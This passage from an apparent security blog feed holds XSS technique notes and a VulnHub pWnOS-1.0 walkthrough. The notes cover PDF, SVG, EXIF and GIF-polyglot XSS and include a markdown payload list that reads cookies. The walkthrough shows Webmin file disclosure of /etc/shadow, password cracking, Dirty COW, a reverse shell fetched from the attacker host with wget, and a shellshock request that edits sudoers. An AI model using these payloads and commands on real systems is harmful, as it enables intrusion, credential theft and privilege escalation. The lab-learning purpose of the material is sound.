id="PDF-XSS"><a class="header-anchor" href="#PDF-XSS">¶</a>PDF XSS</h2><blockquote><p>PDF注入值得新开一篇文章</p></blockquote><ol><li>新建一个空的 PDF, 对着空白界面右键, 选择属性</li><li>页面属性中, 动作栏中有一个打开界面时的操作, 打开时编辑动作列表</li><li>新增-&gt;运行 JavaScript</li><li>写入 XSS, 如下所示, 点击确定, 最后另存为即可</li></ol><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">app.<span class="title function_">alert</span>(<span class="number">1</span>)</span><br></pre></td></tr></table></figure><p>制作 PDF 文件后直接用浏览器打开能触发 XSS, 目的当然是让网站在线解析我们制作的 PDF</p><p>如果你不喜欢还可以换一个方式, 比如用python</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> PyPDF2 <span class="keyword">import</span> PdfReader, PdfWriter</span><br><span class="line"><span class="comment"># 创建一个新的 PDF 文档</span></span><br><span class="line">output_pdf = PdfWriter()</span><br><span class="line"><span class="comment"># 添加一个新页面</span></span><br><span class="line">page = output_pdf.add_blank_page(width=<span class="number">72</span>, height=<span class="number">72</span>)</span><br><span class="line"><span class="comment"># 添加js代码</span></span><br><span class="line">output_pdf.add_js(<span class="string">&quot;app.alert(&#x27;xss&#x27;);&quot;</span>)</span><br><span class="line"><span class="comment"># 将新页面写入到新 PDF 文档中</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;alert.pdf&quot;</span>, <span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    output_pdf.write(f)</span><br></pre></td></tr></table></figure><blockquote><p>我想这里如果是能执行任意 js 代码, 能不能扩大化利用呢</p></blockquote><h2 id="文件上传XSS"><a class="header-anchor" href="#文件上传XSS">¶</a>文件上传XSS</h2><p><a href="https://cloud.tencent.com/developer/article/1165636">文章</a></p><h3 id="文件名"><a class="header-anchor" href="#文件名">¶</a>文件名</h3><p>文件名本身可能会反映在页面上, 所以一个带有XSS命名的文件便可以起到攻击作用</p><h3 id="修改文件后缀"><a class="header-anchor" href="#修改文件后缀">¶</a>修改文件后缀</h3><p>能上传 <code>.html</code> 和 <code>.htm</code> , 在文件内容当中插入 XSS 代码</p><h3 id="svg中写入-Content"><a class="header-anchor" href="#svg中写入-Content">¶</a>svg中写入 (Content)</h3><p>如果网站支持svg格式的文件进行上传的话, 可以上传带有XSS的svg文件</p><blockquote><p>SVG（Scalable Vector Graphics）是一种用于描述二维矢量图形的 XML 格式文件, 可嵌入JavaScript (严格地说, 应该是ECMAScript) 脚本来控制SVG对象</p></blockquote><p>将下面的代码修改为 svg 后缀即可, 上传后访问即可触发</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">svg</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://www.w3.org/2000/svg&quot;</span> <span class="attr">version</span>=<span class="string">&quot;1.1&quot;</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">circle</span> <span class="attr">cx</span>=<span class="string">&quot;100&quot;</span> <span class="attr">cy</span>=<span class="string">&quot;50&quot;</span> <span class="attr">r</span>=<span class="string">&quot;40&quot;</span> <span class="attr">stroke</span>=<span class="string">&quot;black&quot;</span> <span class="attr">stroke-width</span>=<span class="string">&quot;2&quot;</span> <span class="attr">fill</span>=<span class="string">&quot;red&quot;</span> /&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">script</span>&gt;</span>alert(1)<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">svg</span>&gt;</span></span><br></pre></td></tr></table></figure><p>svg作为脚本也可以正常触发</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;1.svg&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="exif写入-Metadata"><a class="header-anchor" href="#exif写入-Metadata">¶</a>exif写入 (Metadata)</h3><blockquote><p>EXIF (Exchangeable Image File Format)是一种嵌入在图片文件(如 JPEG, RAW)中的元数据标准, 用于记录拍摄时的设备参数和环境信息; <strong>需要网站解析图片的exif信息才可以使用此方法</strong></p></blockquote><p>不过都可以试试, 插入js的方式是利用exiftool</p><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">exiftool <span class="literal">-Comment</span>=<span class="string">&quot;&lt;script&gt;alert(1)&lt;/script&gt; filename.png&quot;</span></span><br></pre></td></tr></table></figure><h3 id="GIF中写入"><a class="header-anchor" href="#GIF中写入">¶</a>GIF中写入</h3><p>建立一个携带有JavaScript payload的GIF图像用作一个脚本的源, 这种技术通常被称为<code>GIF-JavaScript Polyglot</code>或<code>图像JS注入</code>, 是一种将JavaScript代码嵌入到看似正常的GIF图像文件中的方法</p><p>这对绕过CSP (内容安全策略) 保护 <code>script-src 'self'</code> 是很有用的, 但前提是我们能够成功地在相同的域注入</p><p><strong>原理概述</strong></p><p>当CSP设置为<code>script-src 'self'</code>时：</p><ol><li>允许加载同源域的脚本文件</li><li>阻止内联脚本 (如 <code>&lt;script&gt;alert(1)&lt;/script&gt;</code> )</li><li>阻止外部域的脚本</li></ol><p>攻击者可以通过：</p><ol><li>在同源域上传一个恶意构造的GIF文件 (实际是JS/GIF polyglot)</li><li>通过标签引用这个GIF文件</li><li>浏览器将其作为脚本执行 (因为来自&quot;self&quot;)</li></ol><p>下面是一个简单的GIF文件, 保存为gif即可</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GIF89a/*&lt;svg/onload=alert(1)&gt;*/=alert(document.domain)//;</span><br></pre></td></tr></table></figure><blockquote><p>文件类unix命令和PHP函数中的 <code>exif_imagetype()</code> 和 <code>getimagesize()</code> 会将其识别为一个GIF文件</p></blockquote><p>最终引用需要script标签</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;/uploads/malicious.gif&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><h1>情景</h1><h2 id="结合XFF和日志界面"><a class="header-anchor" href="#结合XFF和日志界面">¶</a>结合XFF和日志界面</h2><p>如果存在X-Forwarded-For伪造(这个是低危漏洞)且该系统拥有关于日志的界面(比如说用户操作日志, 反正就是日志经过处理显示在前端的), 可以尝试XSS</p><blockquote><p>X-Forwarded-For（XFF）是一个 HTTP 扩展头部，用于标识客户端通过代理服务器的真实 IP 地址。攻击者可通过直接修改该头部值伪造客户端来源 IP（例如隐藏恶意 IP 或绕过基于 IP 的访问限制），导致服务端误判请求来源。</p></blockquote><p>方法很简单, 利用保存日志时XFF的内容作为IP被写入(且一般日志的读取和保存不会有针对性的waf), 在关于日志的界面被拉出来渲染/执行, 就可以触发XSS甚至RCE</p><p>对于<code>h****ei</code>的waf, 我用了下面这个方法绕过</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">details</span> <span class="attr">open</span> <span class="attr">ontoggle</span>=<span class="string">&quot;c=1;top[&#x27;ale&#x27;+&#x27;rt&#x27;].call(null,c)&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure><p>waf测试如下:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">被过滤</span><br><span class="line">&lt;svg/onload&gt;</span><br><span class="line">&lt;img src/onerror=&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">&lt;input/onfocus=&gt;</span><br><span class="line">&lt;alert()&gt;</span><br><span class="line">eval</span><br><span class="line"></span><br><span class="line">未被过滤</span><br><span class="line">&lt;img/src=x &gt;</span><br><span class="line">&lt;img src/onerror&gt;</span><br><span class="line">&lt;input/onfocus&gt;</span><br><span class="line">&lt;onload&gt;</span><br><span class="line">&lt;onload=&gt;</span><br><span class="line">&lt;onload=(1)/&gt;</span><br><span class="line">&lt;alert&gt;</span><br></pre></td></tr></table></figure><p>没有对空格过滤, 但是对特定组合有过滤似乎是对特定属性存在过滤, 不允许有值, 那就是黑名单</p><p>但是, 完全不止, 因为插入多长都没有问题, 所以可以写进去一个完整的html, 甚至能塞个上传点, 记录下肯定有用</p><h2 id="结合下拉框"><a class="header-anchor" href="#结合下拉框">¶</a>结合下拉框</h2><p>就算界面存在实体化, 但是对于一些下拉列表就不一定有</p><p>所以可以在列表读取的地方插入xss, 然后通过下拉列表触发</p><p>比如说我这里有一堆项目, 而隔壁管理功能需要用下拉列表选择项目然后再进行管理. 此时我在项目中插入, 在下拉列表处触发</p><h2 id="结合审核功能"><a class="header-anchor" href="#结合审核功能">¶</a>结合审核功能</h2><p>构造一个用户名是一个 XSS 攻击的申请, 审核员点击通过的时候就可能触发XSS</p><h2 id="利用基于AngularJS的XSS实现提权"><a class="header-anchor" href="#利用基于AngularJS的XSS实现提权">¶</a>利用基于AngularJS的XSS实现提权</h2><p><a href="https://www.freebuf.com/articles/web/213783.html">https://www.freebuf.com/articles/web/213783.html</a></p><h1>Fuzzing</h1><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment">Fuzzing examples from</span></span><br><span class="line"><span class="comment">- https://github.com/cujanovic/Markdown-XSS-Payloads/blob/master/Markdown-XSS-Payloads.txt</span></span><br><span class="line"><span class="comment">- https://makandracards.com/makandra/481451-testing-for-xss-in-markdown-fields</span></span><br><span class="line"><span class="comment">--&gt;</span></span><br><span class="line"></span><br><span class="line">[a](javascript:prompt(document.cookie))</span><br><span class="line">[a](j    a   v   a   s   c   r   i   p   t:prompt(document.cookie))</span><br><span class="line">![a](javascript:prompt(document.cookie))\</span><br><span class="line">&lt;javascript:prompt(document.cookie)&gt;</span><br><span class="line">&lt;javascript:alert(&#x27;XSS&#x27;)&gt;</span><br><span class="line">  ![a](data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K)\</span><br><span class="line">[a](data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K)</span><br><span class="line">[a](javascript:alert(&#x27;XSS&#x27;))</span><br><span class="line">![a&#x27;&quot;`onerror=prompt(document.cookie)](x)\</span><br><span class="line">[citelol]: (javascript:prompt(document.cookie))</span><br><span class="line">[notmalicious](javascript:window.onerror=alert;throw%20document.cookie)</span><br><span class="line">[test](javascript://%0d%0aprompt(1))</span><br><span class="line">[test](javascript://%0d%0aprompt(1);com)</span><br><span class="line">[notmalicious](javascript:window.onerror=alert;throw%20document.cookie)</span><br><span class="line">[notmalicious](javascript://%0d%0awindow.onerror=alert;throw%20document.cookie)</span><br><span class="line">[a](data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K)</span><br><span class="line">[clickme](vbscript:alert(document.domain))</span><br><span class="line">_http://danlec_@.1 style=background-image:url(data:image/png;base64,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);background-repeat:no-repeat;display:block;width:100%;height:100px; onclick=alert(unescape(/Oh%20No!/.source));return(false);//</span><br><span class="line">&lt;http://\&lt;meta\ http-equiv=\&quot;refresh\&quot;\ content=\&quot;0;\ url=http://danlec.com/\&quot;\&gt;&gt;</span><br><span class="line">[text](http://danlec.com &quot; [@danlec](/danlec) &quot;)</span><br><span class="line">[a](javascript:this;alert(1))</span><br><span class="line">[a](javascript:this;alert(1<span class="symbol">&amp;#41;</span>)</span><br><span class="line">[a](javascript&amp;#58this;alert(1<span class="symbol">&amp;#41;</span>)</span><br><span class="line">[a](Javas<span class="symbol">&amp;#99;</span>ript:alert(1<span class="symbol">&amp;#41;</span>)</span><br><span class="line">[a](Javas%26%2399;ript:alert(1<span class="symbol">&amp;#41;</span>)</span><br><span class="line">[a](javascript:alert<span class="symbol">&amp;#65534;</span>(1<span class="symbol">&amp;#41;</span>)</span><br><span class="line">[a](javascript:confirm(1)</span><br><span class="line">[a](javascript://www.google.com%0Aprompt(1))</span><br><span class="line">[a](javascript://%0d%0aconfirm(1);com)</span><br><span class="line">[a](javascript:window.onerror=confirm;throw%201)</span><br><span class="line">[a](javascript:alert(document.domain<span class="symbol">&amp;#41;</span>)</span><br><span class="line">[a](javascript://www.google.com%0Aalert(1))</span><br><span class="line">[a](&#x27;javascript:alert(&quot;1&quot;)&#x27;)</span><br><span class="line">[a](JaVaScRiPt:alert(1))</span><br><span class="line">![a](https://www.google.com/image.png&quot;onload=&quot;alert(1))</span><br><span class="line">![a](&quot;onerror=&quot;alert(1))</span><br><span class="line">&lt;/http://<span class="meta">&lt;?php\&gt;&lt;\h1\&gt;&lt;script:script&gt;confirm(2)</span></span><br><span class="line"><span class="meta">[XSS](.alert(1);)</span></span><br><span class="line"><span class="meta">[ ](https://a.de?p=[[/data-x=. style=background-color:#000000;z-index:999;width:100%;position:fixed;top:0;left:0;right:0;bottom:0; data-y=.]])</span></span><br><span class="line"><span class="meta">[ ](http://a?p=[[/onclick=alert(0) .]])</span></span><br><span class="line"><span class="meta">[a](javascript:new%20Function`al\ert\`1\``;)</span></span><br><span class="line"><span class="meta">[XSS](javascript:prompt(document.cookie))</span></span><br><span class="line"><span class="meta">[XSS](j    a   v   a   s   c   r   i   p   t:prompt(document.cookie))</span></span><br><span class="line"><span class="meta">[XSS](data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K)</span></span><br><span class="line"><span class="meta">[XSS](javascript:alert(&#x27;XSS&#x27;))</span></span><br><span class="line"><span class="meta">[XSS]: (javascript:prompt(document.cookie))</span></span><br><span class="line"><span class="meta">[XSS](javascript:window.onerror=alert;throw%20document.cookie)</span></span><br><span class="line"><span class="meta">[XSS](javascript://%0d%0aprompt(1))</span></span><br><span class="line"><span class="meta">[XSS](javascript://%0d%0aprompt(1);com)</span></span><br><span class="line"><span class="meta">[XSS](javascript:window.onerror=alert;throw%20document.cookie)</span></span><br><span class="line"><span class="meta">[XSS](javascript://%0d%0awindow.onerror=alert;throw%20document.cookie)</span></span><br><span class="line"><span class="meta">[XSS](data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K)</span></span><br><span class="line"><span class="meta">[XSS](vbscript:alert(document.domain))</span></span><br><span class="line"><span class="meta">[XSS](javascript:this;alert(1))</span></span><br><span class="line"><span class="meta">[XSS](javascript:this;alert(1&amp;#41;)</span></span><br><span class="line"><span class="meta">[XSS](javascript&amp;#58this;alert(1&amp;#41;)</span></span><br><span class="line"><span class="meta">[XSS](Javas&amp;#99;ript:alert(1&amp;#41;)</span></span><br><span class="line"><span class="meta">[XSS](Javas%26%2399;ript:alert(1&amp;#41;)</span></span><br><span class="line"><span class="meta">[XSS](javascript:alert&amp;#65534;(1&amp;#41;)</span></span><br><span class="line"><span class="meta">[XSS](javascript:confirm(1)</span></span><br><span class="line"><span class="meta">[XSS](javascript://www.google.com%0Aprompt(1))</span></span><br><span class="line"><span class="meta">[XSS](javascript://%0d%0aconfirm(1);com)</span></span><br><span class="line"><span class="meta">[XSS](javascript:window.onerror=confirm;throw%201)</span></span><br><span class="line"><span class="meta">[XSS](�javascript:alert(document.domain&amp;#41;)</span></span><br><span class="line"><span class="meta">![XSS](javascript:prompt(document.cookie))\</span></span><br><span class="line"><span class="meta">![XSS](data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K)\</span></span><br><span class="line"><span class="meta">![XSS&#x27;&quot;`onerror=prompt(document.cookie)](x)\</span></span><br><span class="line"><span class="meta"></span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Web工具 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> XSS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pWnOS-1.0</title>
      <link href="/article/64097/"/>
      <url>/article/64097/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><h1>pWnOS-1.0</h1><hr><blockquote><p>来源: <a href="https://www.vulnhub.com/entry/pwnos-10,33/">vulnhub靶场-pWnOS: 1.0</a></p><p>目标: 我觉得是获取root权限</p><p>提示: If Vmware asks whether you copied or moved this virtual machine on first boot, click MOVED! Otherwise the network settings could get messed up.</p><p>妙妙工具: <code>python -c 'import pty; pty.spawn(&quot;/bin/bash&quot;)'</code></p></blockquote><h2 id="环境配置"><a class="header-anchor" href="#环境配置">¶</a>环境配置</h2><ul><li>kali: 192.168.110.130</li><li>target: 192.168.110.128</li></ul><h2 id="信息收集"><a class="header-anchor" href="#信息收集">¶</a>信息收集</h2><p>nmap</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 获取靶机地址 192.168.110.128</span></span><br><span class="line">sudo nmap -sn 192.168.110.0/24</span><br><span class="line"><span class="comment"># 获取端口信息 22,80,139,445,10000</span></span><br><span class="line">sudo nmap -sT --min-rate 10000 -p- 192.168.110.128 -oA scan/ports</span><br><span class="line"><span class="comment"># 获取详细信息</span></span><br><span class="line">sudo nmap -sT -sV -sC -O -p22,80,139,445,10000 192.168.110.128 -oA scan/detail</span><br><span class="line"><span class="comment"># 看看漏洞</span></span><br><span class="line">sudo nmap --script=vuln -p22,80,139,445,10000 192.168.110.128 -oA scan/vuln</span><br></pre></td></tr></table></figure><p>139和445提供了 Samba smbd 3.3.26a 服务, 10000则提供了MiniServ 0.01服务</p><ol><li>系统的内核比较旧, 可能可以用脏牛提权</li><li>经过漏洞扫描, 似乎有一个<code>CVE-2006-3392</code>的文件泄露</li></ol><h3 id="80-http"><a class="header-anchor" href="#80-http">¶</a>80/http</h3><p>先来目录扫描扫一下</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/index2</span><br><span class="line">/index2.php</span><br><span class="line">/php</span><br></pre></td></tr></table></figure><p>在php目录下找到文件夹phpMyAdmin, 我们并没有发现这个服务, 而且进入该文件夹需要密码, 放在一边</p><h3 id="139-445"><a class="header-anchor" href="#139-445">¶</a>139/445</h3><p>sabmap扫描发现没法利用, 那就扔在一边了</p><h3 id="10000-http"><a class="header-anchor" href="#10000-http">¶</a>10000/http</h3><p><img src="https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/20250312164820.png" alt="image.png"></p><p>看起来像是一个cms, 搜索关键词Webmin找一些漏洞利用脚本来用</p><p>找到了一个<code>CVE-2019-15107</code>的漏洞利用脚本<a href="https://github.com/MuirlandOracle/CVE-2019-15107/blob/main/CVE-2019-15107.py">github地址</a>, 运行说版本过低不能利用, 似乎是0.01版本?直接贴图吧</p><p><img src="https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/20250312170730.png" alt="image.png"></p><p>所以我们要找一些非常老的漏洞?看看漏洞库有没有那种很老的吧</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">searchsploit webmin</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/20250312171852.png" alt="image.png"></p><p>这三个中, php是要apache环境, ruby是要放在msf框架中, 而pl文件比较好使用, 就用你了</p><blockquote><p>其实是都试过发现要么报错要么麻烦; 而且如果你看过这个<code>2017.pl</code>, 你会发现里面的payload似乎就是nmap扫描出来的那个漏洞, 用<code>%01</code>绕过<code>../</code>限制的那个</p></blockquote><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 获取帮助</span></span><br><span class="line">perl 2017.pl</span><br><span class="line"><span class="comment"># 尝试获取信息</span></span><br><span class="line">perl 2017.pl 192.168.110.128 10000 /etc/passwd 0</span><br><span class="line"><span class="comment"># 获取加密过的密码</span></span><br><span class="line">perl 2017.pl 192.168.110.128 10000 /etc/shadow 0</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/20250312172924.png" alt="image.png"></p><p>利用john对密码进行爆破, 得到<code>vmware:h4ckm3</code></p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo john usrhash --wordlist=/usr/share/wordlists/rockyou.txt</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/20250312173423.png" alt="image.png"></p><h2 id="getshell"><a class="header-anchor" href="#getshell">¶</a>getshell</h2><p>对<code>shadow</code>的爆破可以直接利用ssh获取shell, 但是不排除有密码复用的情况用于登录其他地方, 这里就不赘述了, 直接登录获取shell</p><blockquote><p>报错Unable to negotiate with 192.168.110.128 port 22: no matching host key type found. Their offer: ssh-rsa,ssh-dss, 那就加上它想要的参数就行</p></blockquote><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ssh -oHostKeyAlgorithms=ssh-rsa,ssh-dss vmware@192.168.110.128</span><br></pre></td></tr></table></figure><h2 id="信息收集-v2"><a class="header-anchor" href="#信息收集-v2">¶</a>信息收集</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 系统信息 Linux ubuntuvm 2.6.22-14-server #1 SMP Sun Oct 14 23:34:23 GMT 2007 i686 GNU/Linux</span></span><br><span class="line"><span class="built_in">uname</span> -a</span><br><span class="line"><span class="comment"># 内核版本 2.6.22-14-server</span></span><br><span class="line"><span class="built_in">uname</span> -r</span><br><span class="line"><span class="comment"># 查看发行版的信息 Ubuntu 7.10</span></span><br><span class="line">lsb_release -a</span><br><span class="line"><span class="comment"># 查看环境</span></span><br><span class="line">python -h</span><br><span class="line">nc -h</span><br><span class="line">gcc -v</span><br><span class="line"><span class="comment"># 查看权限, 无</span></span><br><span class="line">sudo -l</span><br><span class="line"><span class="comment"># 查看特权文件, 无发现</span></span><br><span class="line">find / -perm -u=s -<span class="built_in">type</span> f 2&gt;/dev/null</span><br><span class="line"><span class="comment"># 看看计划任务, 无发现</span></span><br><span class="line"><span class="built_in">cat</span> /etc/crontab</span><br></pre></td></tr></table></figure><p>本来想看看webmin的配置文件藏了什么的, 结果访问<code>/var/webmin</code>的时候说我权限不足, 看了一眼发现是root权限的</p><p>现在可能就是看看能不能利用webmin的文件包含给我们反弹一个shell来获取root权限</p><h2 id="提权"><a class="header-anchor" href="#提权">¶</a>提权</h2><h3 id="dirty-cow"><a class="header-anchor" href="#dirty-cow">¶</a>dirty cow</h3><p>脏牛漏洞提权可以用<code>linux/local/40839.c</code>, 靶机中有gcc环境; 如果报错你可以在代码的最后手动加上一个空格, 也不知道为什么这么报错</p><p>编译方式如下, 切换为firefart用户即可拿到root权限</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">gcc -pthread 40839.c -o dirty -lcrypt</span><br></pre></td></tr></table></figure><h3 id="反弹shell"><a class="header-anchor" href="#反弹shell">¶</a>反弹shell</h3><p>尝试包含php文件, 奇怪, 似乎直接返回了源码而没有被执行</p><p>看大佬的博客, 用的是perl的反弹马, 且将后缀改为了cgi再包含才被成功执行</p><blockquote><p>尝试登录cms的时候网址不是<code>session_login.cgi</code>吗, 可能就是从这里来的</p></blockquote><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># kali</span></span><br><span class="line"><span class="built_in">cp</span> /usr/share/webshells/perl/perl-reverse-shell.pl shell.cgi</span><br><span class="line">python3 -m http.server 8888</span><br><span class="line"><span class="comment"># target</span></span><br><span class="line">wget http://192.168.110.130:8888/shell.cgi</span><br><span class="line"><span class="comment"># kali</span></span><br><span class="line">nc -lvnp 6666</span><br><span class="line">perl 2017.pl 192.168.110.128 10000 /home/vmware/shell.cgi 0</span><br></pre></td></tr></table></figure><p>如果你之前用了脏牛, 获取反弹shell后输入whoami应该是firefart</p><h3 id="shellshock"><a class="header-anchor" href="#shellshock">¶</a>shellshock</h3><p>bash版本小于4.3, 一般会存在shellshock漏洞. 网上可以找到比较多的验证语句, 随便拿一个就行</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># GNU bash, version 3.2.25(1)-release (i486-pc-linux-gnu)</span></span><br><span class="line">bash --version</span><br><span class="line"><span class="comment"># 测试语句, 成功输出 It is vulnerable</span></span><br><span class="line"><span class="built_in">env</span> x=<span class="string">&#x27;() &#123; :; &#125;; echo &quot;It is vulnerable&quot;&#x27;</span> bash -c <span class="built_in">date</span></span><br></pre></td></tr></table></figure><p>结合前面的<code>2017.pl</code>的payload, 系统可执行文件为cgi文件, 已知的账密<code>vmware:h4ckm3</code>进行利用</p><blockquote><p>obama我们没有密码, 后面就算赋予了sudo权限我们照样利用不了, 所以需要一个已知的账密</p></blockquote><p>首先创建恶意文件准备被包含</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># target</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;#!/bin/bash&quot;</span> &gt;&gt; shell.cgi</span><br><span class="line"><span class="built_in">chmod</span> +x shell.cgi</span><br></pre></td></tr></table></figure><p>首先利用shellshock赋予vmware用户sudo权限, 这时候执行<code>sudo -l</code>应该是ALL=(ALL)ALL</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">curl http://192.168.110.128:10000/unauthenticated/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/home/vmware/halo.cgi -A <span class="string">&#x27;() &#123; :; &#125;; /bin/echo &quot;vmware ALL=(ALL)ALL&quot; &gt;&gt; /etc/sudoers&#x27;</span></span><br></pre></td></tr></table></figure><p>随后就是sudo提权</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo /bin/bash</span><br></pre></td></tr></table></figure><h2 id="附录"><a 